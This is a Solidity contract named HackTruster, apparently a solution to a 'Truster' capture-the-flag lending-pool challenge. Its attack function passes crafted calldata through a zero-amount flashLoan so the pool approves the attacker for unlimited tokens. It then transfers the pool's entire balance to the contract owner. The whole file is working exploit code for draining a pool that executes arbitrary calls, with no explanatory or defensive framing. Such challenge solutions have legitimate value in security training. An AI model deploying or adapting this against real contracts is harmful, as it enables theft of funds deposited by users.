// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITrusterLenderPool {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external returns (bool);
}

contract HackTruster is Ownable {
    ITrusterLenderPool private pool;
    IERC20 private token;

    constructor(address _pool, address _token) {
        pool = ITrusterLenderPool(_pool);
        token = IERC20(_token);
    }

    function attack() external onlyOwner {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);

        pool.flashLoan(0, address(this), address(token), data);

        token.transferFrom(address(pool), owner(), token.balanceOf(address(pool)));
    }
}
